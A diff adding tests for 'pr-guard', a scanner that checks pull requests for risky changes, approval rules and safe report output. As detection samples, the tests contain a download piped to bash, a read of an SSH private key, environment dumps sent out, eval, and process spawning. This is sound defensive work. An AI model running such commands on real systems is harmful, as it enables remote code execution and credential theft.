+  test("a host built at run time is flagged, since it cannot be compared", () => {
+    assert.match(details(check({ "app/src/lib/send.ts": "await fetch(`https://${target}/in`);\n" }), "new-host"), /\(computed\)/);
+  });
+
+  test("hostOf strips credentials, ports and case", () => {
+    assert.equal(hostOf("User:pw@Example-RPC.io:8443"), "example-rpc.io");
+    assert.equal(hostOf("evil_site.com"), "evil_site.com");
+    assert.equal(hostOf("${host}"), "(computed)");
+  });
+
+  test("code execution, raw HTML and process spawning are flagged, in tests as well", () => {
+    const samples = {
+      "eval()": "const out = eval(source);",
+      "new Function()": 'const run = new Function("return 1");',
+      "raw HTML injection": "<div dangerouslySetInnerHTML={{ __html: bio }} />",
+      "starting a process": 'import { execSync } from "node:child_process";',
+      "a computed import or require": "const mod = await import(name);",
+      "reading the whole environment": "await send(JSON.stringify(process.env));",
+      "decoding hidden text": 'const payload = atob("aGk=");',
+      "a download piped to a shell": "curl -fsSL https://example.org/install.sh | bash",
+      "reading the home directory or a key store": 'readFileSync(join(homedir(), ".ssh/id_ed25519"));',
+    };
+    for (const [what, text] of Object.entries(samples)) {
+      for (const path of ["app/src/lib/util.ts", "app/src/lib/util.test.ts"]) {
+        const found = scanLines(path, [{ n: 1, text }], [], { addresses: new Set(), hosts: new Set(), env: new Set() });
+        assert.ok(of(found, "dangerous-code").some((f) => f.detail === what), `${what} in ${path}`);
+      }
+    }
+  });
+
+  test("a file is read as code whatever its extension; prose is not", () => {
+    assert.deepEqual(rules(check({ "app/src/lib/helper": "eval(input);\n" })), ["dangerous-code"]);
+    assert.deepEqual(rules(check({ "app/src/lib/helper.weird": "eval(input);\n" })), ["dangerous-code"]);
+    assert.deepEqual(rules(check({ "docs/guide.md": "Never call `eval(input)` on user text.\n" })), []);
+  });
+
+  test("app code cannot hide behind a test file's name", () => {
+    const found = check({ "app/src/lib/pay.ts": 'import { TREASURY } from "./pay.test";\nexport const to = TREASURY;\n', "app/src/lib/pay.test.ts": `export const TREASURY = "${STRANGER}";\n` });
+    assert.deepEqual(rules(found), ["dangerous-code"]);
+    assert.equal(found[0].detail, "app code importing a test file");
+    assert.deepEqual(rules(check({ "app/src/lib/a.test.ts": 'import { helper } from "./b.test";\n' })), [], "a test may import a test");
+  });
+
+  test("ordinary code that looks similar is left alone", () => {
+    assert.deepEqual(rules(check({ "contracts/src/Vault.sol": "contract Vault {\n  function f(uint256 a) external pure { require(a > 0, \"zero\"); }\n}\n" })), ["contracts"], "Solidity's require is not Node's");
+    for (const text of ['const m = /a/.exec(text);', 'const mod = await import("./chart");', "const key = process.env.BASE_RPC_URL;", "particles.spawn(3);", 'el.textContent = "hi";']) {
+      assert.deepEqual(of(scanLines("app/src/lib/util.ts", [{ n: 1, text }], [], { addresses: new Set(), hosts: new Set(), env: new Set(["BASE_RPC_URL"]) }), "dangerous-code"), [], text);
+    }
+  });
+
+  test("dropping a rate limit or a signature check is flagged", () => {
+    const found = check({ "app/src/app/api/post/route.ts": ROUTE.replace("  if (await rateLimited(request)) return tooMany();\n", "").replace("!ok || ", "") });
+    assert.deepEqual(rules(found), ["auth-removed"]);
+    assert.match(details(found, "auth-removed"), /rateLimited: 1 fewer use/);
+  });
+
+  test("moving a check within the file is not a removal", () => {
+    const moved = ROUTE.replace("  if (await rateLimited(request)) return tooMany();\n", "").replace("  return save(", "  if (await rateLimited(request)) return tooMany();\n  return save(");
+    assert.deepEqual(rules(check({ "app/src/app/api/post/route.ts": moved })), []);
+  });
+
+  test("a new environment variable is named; an existing one is not", () => {
+    const found = check({ "app/src/lib/keys.ts": "const a = process.env.BASE_RPC_URL, b = process.env.ADMIN_SIGNER_KEY, c = process.env[\"NEXT_PUBLIC_NEW\"];\n" });
+    assert.deepEqual(rules(found), ["new-env"]);
+    assert.equal(details(found, "new-env"), "ADMIN_SIGNER_KEY | NEXT_PUBLIC_NEW");
+  });
+
+  test("encoded blobs and very long lines need a person", () => {
+    assert.deepEqual(rules(check({ "app/src/lib/blob.ts": `export const data = "${"QUJD".repeat(120)}";\n` })), ["opaque"]);
+    assert.deepEqual(rules(check({ "app/src/lib/min.js": `var a=1;${"a=a+1;".repeat(400)}\n` })), ["opaque"]);
+    assert.deepEqual(rules(check({ "app/src/lib/obf.js": "var _0x4f2a=['log'];\n" })), ["opaque"]);
+  });
+
+  test("security headers, deploy files, migrations and policy files need an owner", () => {
+    assert.deepEqual(rules(check({ "app/src/lib/security-headers.ts": "export const csp = \"default-src *\";\n" })), ["security-config"]);
+    assert.deepEqual(rules(check({ "app/Dockerfile": "FROM node:22-slim\nRUN true\n" })), ["build-deploy"]);
+    assert.deepEqual(rules(check({ "app/db/schema.sql": "drop table launches;\n" })), ["build-deploy"]);
+    assert.deepEqual(rules(check({ "app/scripts/fix.mjs": "console.log(1);\n" })), ["build-deploy"]);
+    assert.deepEqual(rules(check({ "SECURITY.md": "Report to help@elsewhere.example.com\n" })), ["policy"]);
+    assert.deepEqual(rules(check({ ".gitattributes": "*.sol linguist-vendored\n" })), ["git-config"]);
+  });
+
+  test("static pages, scripts and .well-known files served by the site need an owner", () => {
+    assert.deepEqual(rules(check({ "app/public/sw.js": "self.addEventListener('fetch', () => {});\n" })), ["security-config"]);
+    assert.deepEqual(rules(check({ "app/public/.well-known/farcaster.json": '{ "accountAssociation": {} }\n' })), ["security-config"]);
+    assert.deepEqual(rules(check({ "app/public/claim.html": "<h1>Claim</h1>\n" })), ["security-config"]);
+  });
+
+  test("a line too long to match is flagged instead of skipped, and hidden characters in it are still found", () => {
+    const long = `export const x = "${"ab ".repeat(4000)}";`;
+    assert.match(details(check({ "app/src/lib/long.ts": `${long}\n` }), "opaque"), /too long to match against the rules/);
+    assert.deepEqual(rules(check({ "app/src/lib/long.ts": `${long}${cp(0x202e)}\n` })), ["hidden-unicode", "opaque"]);
+  });
+
+  test("a flood of findings in one file is cut short, and a block among them is kept", () => {
+    const found = check({ "app/src/lib/flood.ts": `${"eval(x);\n".repeat(300)}const y = "${cp(0x200b)}";\n` });
+    assert.equal(of(found, "dangerous-code").length, 199);
+    assert.equal(of(found, "hidden-unicode").length, 1);
+    assert.match(details(found, "unscanned"), /101 more findings in this file are not listed/);
+  });
+
+  test("thousands of emoji joiners on one line are checked without slowing down", () => {
+    const started = Date.now();
+    assert.equal(hiddenCharacter(cp(0x1f468, 0x200d, 0x1f469).repeat(200_000)), null);
+    assert.ok(Date.now() - started < 5000);
+  });
+
+  test("a file made executable is noted", () => {
+    assert.match(details(check({ "app/src/lib/run.ts": { content: "export {};\n", mode: 0o755 } }), "build-deploy"), /marked executable/);
+  });
+
+  test("an ordinary change passes with no findings", () => {
+    assert.deepEqual(check({
+      "app/src/components/Hero.tsx": "export function Hero() {\n  return <h1 className=\"text-xl\">Launch should be open and free.</h1>;\n}\n",
+      "app/src/components/hero.test.ts": 'import test from "node:test";\ntest("hero renders", () => {});\n',
+      "README.md": "# openlaunch\n\nLaunch should be open and free. Docs: https://openlaunch.lol/agents\n\nThanks to everyone who helped.\n",
+      "docs/guide.md": "## Guide\n\nRun `npm test`.\n",
+    }), []);
+  });
+
+  test("only the lines a pull request adds are judged", () => {
+    const bio = "export const Bio = () => <p dangerouslySetInnerHTML={{ __html: bio }} />;\n";
+    git(["checkout", "-q", "-f", "--detach", baseSha]);
+    const sinkBase = commit({ "app/src/components/Bio.tsx": bio }, "base with an existing sink");
+    const head = commit({ "app/src/components/Bio.tsx": `// a comment above\n${bio}` }, "pull request");
+    assert.deepEqual(analyze(openRepo(dir, sinkBase, head), { lockedPaths: LOCKED }), []);
+  });
+
+  test("a file name that looks like a git pathspec is still read", () => {
+    assert.deepEqual(rules(check({ "app/src/:(exclude)x.ts": "eval(input);\n" })), ["dangerous-code"]);
+  });
+
+  test("the pull request is compared with where it branched, not with later commits on main", () => {
+    const head = pullRequest({ "docs/guide.md": "## Guide\n" });
+    git(["checkout", "-q", "-f", "--detach", baseSha]);
+    const laterMain = commit({ "contracts/src/LaunchFactoryArc.sol": "contract LaunchFactoryArc {}\n", ".github/workflows/ci.yml": "name: ci\n# later\n" }, "main moved on");
+    assert.deepEqual(analyze(openRepo(dir, laterMain, head), { lockedPaths: LOCKED }), []);
+  });
+});
+
+// ---------- parsing ----------
+
+describe("parsing", () => {
+  test("parseHunks numbers added lines and keeps removed ones", () => {
+    const diff = ["diff --git a/x b/x", "--- a/x", "+++ b/x", "@@ -2 +2,2 @@", "-old", "+new one\r", "+new two", "@@ -9,0 +11 @@ context", "+++ not a header", "\\ No newline at end of file"].join("\n");
+    assert.deepEqual(parseHunks(diff), { added: [{ n: 2, text: "new one" }, { n: 3, text: "new two" }, { n: 11, text: "++ not a header" }], removed: ["old"] });
+  });
+
+  test("lines that look like diff headers inside the file do not confuse it", () => {
+    const found = check({ "app/src/components/Hero.tsx": `${BASE["app/src/components/Hero.tsx"]}@@ -1 +1 @@\n+++ b/x\neval(x);\n` });
+    assert.deepEqual(rules(found), ["dangerous-code"]);
+    assert.equal(found[0].line, 6);
+  });
+});
+
+// ---------- approval and verdict ----------
+
+describe("verdict", () => {
+  const HEAD = "a".repeat(40), OLD = "b".repeat(40);
+  const owner = OWNERS[0];
+  const review = (login, state, commit_id, submitted_at) => ({ id: Date.parse(submitted_at), user: { login }, state, commit_id, submitted_at });
+  const block = { tier: "block", rule: "contract-locked", path: "contracts/src/LaunchFactory.sol", detail: "edited", line: null };
+  const sensitive = { tier: "review", rule: "address", path: "app/src/lib/launchpad/config.ts", detail: `${STRANGER} (new to the repository)`, line: 2 };
+
+  test("an owner's approval of the head commit counts", () => {
+    assert.equal(ownerApproval([review(owner, "APPROVED", HEAD, "2026-10-11T01:00:00Z")], OWNERS, HEAD), owner);
+    assert.equal(ownerApproval([review(owner.toUpperCase(), "APPROVED", HEAD, "2026-10-11T01:00:00Z")], OWNERS, HEAD), owner);
+  });
+
+  test("an approval of an earlier commit does not: a push after approval needs a new one", () => {
+    assert.equal(ownerApproval([review(owner, "APPROVED", OLD, "2026-10-11T01:00:00Z")], OWNERS, HEAD), null);
+  });
+
+  test("anyone else's approval does not count", () => {
+    assert.equal(ownerApproval([review("someone", "APPROVED", HEAD, "2026-10-11T01:00:00Z"), review(`${owner}x`, "APPROVED", HEAD, "2026-10-11T01:00:00Z")], OWNERS, HEAD), null);
+  });
+
+  test("the owner's latest verdict wins; a comment is not a verdict", () => {
+    const approved = review(owner, "APPROVED", HEAD, "2026-10-11T01:00:00Z");
+    assert.equal(ownerApproval([approved, review(owner, "CHANGES_REQUESTED", HEAD, "2026-10-11T02:00:00Z")], OWNERS, HEAD), null);
+    assert.equal(ownerApproval([review(owner, "DISMISSED", HEAD, "2026-10-11T02:00:00Z"), approved], OWNERS, HEAD), null);
+    assert.equal(ownerApproval([approved, review(owner, "COMMENTED", HEAD, "2026-10-11T02:00:00Z")], OWNERS, HEAD), owner);
+    assert.equal(ownerApproval([review(owner, "CHANGES_REQUESTED", OLD, "2026-10-11T00:00:00Z"), approved], OWNERS, HEAD), owner);
+  });
+
+  test("nothing found passes", () => {
+    assert.deepEqual(verdict([], { author: "someone", sender: "someone" }), { outcome: "pass", ok: true, blocks: 0, reviews: 0, ownPr: false, approvedBy: null });
+  });
+
+  test("a sensitive change from a contributor waits for an owner", () => {
+    assert.equal(verdict([sensitive], { author: "someone", sender: "someone" }).outcome, "review");
+    assert.equal(verdict([sensitive], { author: "someone", sender: "someone" }).ok, false);
+    const approved = verdict([sensitive], { author: "someone", sender: "someone", approvedBy: owner });
+    assert.deepEqual([approved.outcome, approved.ok, approved.approvedBy], ["pass", true, owner]);
+  });
+
+  test("on an owner's own pull request a sensitive change is a notice", () => {
+    const result = verdict([sensitive], { author: owner, sender: owner });
+    assert.deepEqual([result.outcome, result.ok, result.ownPr], ["pass", true, true]);
+  });
+
+  test("an owner's pull request that someone else pushed to is treated like anyone's", () => {
+    assert.equal(verdict([sensitive], { author: owner, sender: "collaborator" }).ok, false);
+    assert.equal(verdict([sensitive], { author: "collaborator", sender: owner }).ok, false);
+  });
+
+  test("a block stays a block: no owner, no approval, nothing turns it into a pass", () => {
+    for (const context of [{ author: owner, sender: owner }, { author: "someone", sender: "someone", approvedBy: owner }, { author: owner, sender: owner, approvedBy: owner }]) {
+      const result = verdict([block, sensitive], context);
+      assert.deepEqual([result.outcome, result.ok], ["block", false]);
+    }
+  });
+
+  test("every rule has a tier, a title and a reason", () => {
+    for (const [rule, meta] of Object.entries(RULES)) {
+      assert.ok(["block", "review"].includes(meta.tier) && meta.title && meta.help, rule);
+    }
+  });
+});
+
+// ---------- report ----------
+
+describe("report", () => {
+  const HEAD = "c".repeat(40);
+  const sensitive = { tier: "review", rule: "new-host", path: "app/src/lib/track.ts", detail: "collect.metrics-cdn.io", line: 4 };
+
+  test("the summary says what happened and what to do next", () => {
+    const waiting = renderSummary([sensitive], verdict([sensitive], { author: "someone", sender: "someone" }), { headSha: HEAD });
+    assert.match(waiting, /^## pr-guard: needs an owner's approval/);
+    assert.match(waiting, /approves commit `ccccccc` with a pull request review, then re-runs this job/);
+    assert.match(waiting, /`app\/src\/lib\/track\.ts`: collect\.metrics-cdn\.io \(line 4\)/);
+    assert.match(renderSummary([], verdict([], {}), { headSha: HEAD }), /^## pr-guard: passed/);
+    const blocked = [{ tier: "block", rule: "ci-config", path: ".github/workflows/ci.yml", detail: "changed", line: null }];
+    assert.match(renderSummary(blocked, verdict(blocked, {}), { headSha: HEAD }), /^## pr-guard: blocked/);
+  });
+
+  test("text from the pull request cannot break out of the report", () => {
+    const path = "app/src/x`.ts\n::error::owned";
+    assert.equal(plain(path), "app/src/x`.ts ::error::owned");
+    const summary = renderSummary([{ ...sensitive, path }], verdict([sensitive], {}), { headSha: HEAD });
+    assert.ok(!summary.includes("x`.ts"), "backticks are replaced inside code spans");
+    assert.ok(!/\n::error/.test(summary));
+    assert.equal(plain(`a${cp(0x202e)}b${cp(0x1b)}c`), "a?b c");
+    assert.equal(plain("x".repeat(500)).length, 201);
+  });
+
+  test("an annotation escapes its message and leaves out an odd file name", () => {
+    const line = annotation("error", { path: "app/src/a.ts", line: 3, title: "pr-guard: x, y: z" }, "50% done\nnext::line");
+    assert.equal(line, "::error title=pr-guard%3A x%2C y%3A z,file=app/src/a.ts,line=3::50%25 done next::line");
+    assert.ok(!annotation("error", { path: "a,b\n::warning::x", line: 1, title: "t" }, "m").includes("file="));
+    assert.equal(annotation("warning", { path: "a.ts", line: null, title: "t" }, "m").split("\n").length, 1);
+  });
+});
+
+// ---------- the command itself ----------
+
+describe("command line", () => {
+  const run = (args) => spawnSync(process.execPath, [GUARD, "--repo", dir, "--lock", lockFile, ...args], { encoding: "utf8", env: { ...process.env, GITHUB_ACTIONS: "", GITHUB_STEP_SUMMARY: "", PR_NUMBER: "", GITHUB_REPOSITORY: "" } });
+
+  test("exit codes follow the verdict", () => {
+    const clean = pullRequest({ "docs/guide.md": "## Guide\n" });
+    assert.equal(run(["--base", baseSha, "--head", clean, "--author", "someone"]).status, 0);
+
+    const sensitive = pullRequest({ "app/src/lib/launchpad/config.ts": BASE["app/src/lib/launchpad/config.ts"].replace(ROUTER, STRANGER) });
+    const waiting = run(["--base", baseSha, "--head", sensitive, "--author", "someone"]);
+    assert.equal(waiting.status, 1);
+    assert.match(waiting.stdout, /pr-guard: review {2}\(0 blocking, 1 for review\)/);
+    assert.equal(run(["--base", baseSha, "--head", sensitive, "--author", "someone", "--approved"]).status, 0);
+    assert.equal(run(["--base", baseSha, "--head", sensitive, "--author", OWNERS[0]]).status, 0);
+    assert.equal(run(["--base", baseSha, "--head", sensitive, "--author", OWNERS[0], "--sender", "collaborator"]).status, 1);
+
+    const blocked = pullRequest({ "contracts/src/LaunchFactory.sol": "contract LaunchFactory { address owner; }\n" });
+    assert.equal(run(["--base", baseSha, "--head", blocked, "--author", OWNERS[0], "--approved"]).status, 1);
+  });
+
+  test("--json carries the findings", () => {
+    const head = pullRequest({ ".github/workflows/ci.yml": "name: ci\n# edited\n" });
+    const out = JSON.parse(run(["--base", baseSha, "--head", head, "--author", "someone", "--json"]).stdout);
+    assert.equal(out.result.outcome, "block");
+    assert.deepEqual(out.findings.map((f) => [f.rule, f.path]), [["ci-config", ".github/workflows/ci.yml"]]);
+  });
+
+  test("when the guard itself cannot finish, the check fails", () => {
+    const missingHead = run(["--base", baseSha, "--head", "f".repeat(40), "--author", OWNERS[0]]);
+    assert.equal(missingHead.status, 1);
+    assert.match(missingHead.stdout, /could not finish, so the check fails/);
+    const noLock = spawnSync(process.execPath, [GUARD, "--repo", dir, "--lock", join(dir, "nope.lock"), "--base", baseSha, "--head", baseSha], { encoding: "utf8" });
+    assert.equal(noLock.status, 1);
+    const emptyLock = join(dirname(lockFile), "empty.lock");
+    writeFileSync(emptyLock, "# nothing\n");
+    assert.equal(spawnSync(process.execPath, [GUARD, "--repo", dir, "--lock", emptyLock, "--base", baseSha, "--head", baseSha], { encoding: "utf8" }).status, 1);
+  });
+
+  test("inside Actions it writes a summary and annotations", () => {
+    const summary = join(dirname(lockFile), "summary.md");
+    writeFileSync(summary, "");
+    const head = pullRequest({ ".github/workflows/ci.yml": "name: ci\n# edited\n", "app/src/lib/t.ts": 'fetch("https://collect.metrics-cdn.io");\n' });
+    const result = spawnSync(process.execPath, [GUARD, "--repo", dir, "--lock", lockFile, "--base", baseSha, "--head", head, "--author", "someone"], { encoding: "utf8", env: { ...process.env, GITHUB_ACTIONS: "true", GITHUB_STEP_SUMMARY: summary, PR_NUMBER: "", GITHUB_REPOSITORY: "" } });
+    assert.equal(result.status, 1);
+    assert.match(result.stdout, /^::error title=pr-guard%3A CI%2C the guard or code owners changed,file=\.github\/workflows\/ci\.yml::/m);
+    assert.match(result.stdout, /^::warning title=pr-guard%3A A host the repository has not used before,file=app\/src\/lib\/t\.ts,line=1::/m);
+    assert.match(execFileSync("cat", [summary]).toString(), /## pr-guard: blocked/);
+  });
+});
